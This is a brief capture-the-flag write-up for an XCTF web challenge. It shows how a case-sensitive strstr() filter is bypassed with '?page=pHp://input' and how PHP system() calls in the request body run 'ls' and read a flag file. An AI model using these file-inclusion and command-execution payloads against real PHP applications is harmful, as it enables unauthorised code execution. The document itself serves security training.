# Challenge: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1

<img width="426" alt="Screen Shot 2021-07-25 at 17 13 14" src="https://user-images.githubusercontent.com/48151790/126895589-30ef5339-7be3-495e-876f-8300223b4ff2.png">

- Hint: `php://` (Accessing various I/O streams)
  * `php://input`

  This is a read-only stream that allows you to read raw data from the request body. php://input is not available with enctype="multipart/form-data"
  
  * Application filter this method by using `strstr()`:

  `strstr(string $haystack, string $needle, bool $before_needle = false): string|false`

  This function is case-sensitive => Use case-insensitive searches to bypass.
  
  => Payload: 
    * `?page=pHp://input`
    * `<?php system('ls'); ?>`
  
- Use BurpSuite to send this payload:

<img width="851" alt="Screen Shot 2021-07-25 at 17 28 11" src="https://user-images.githubusercontent.com/48151790/126895978-8c8c14cc-5a6c-42e2-9090-fac9ed25819b.png">

  * So cat it to find flag: `<?php system('cat fl4gisisish3r3.php'); ?>`
   
  <img width="848" alt="Screen Shot 2021-07-25 at 17 29 50" src="https://user-images.githubusercontent.com/48151790/126896025-a0a667ff-8dba-4ea0-ae17-d758d58780ed.png">
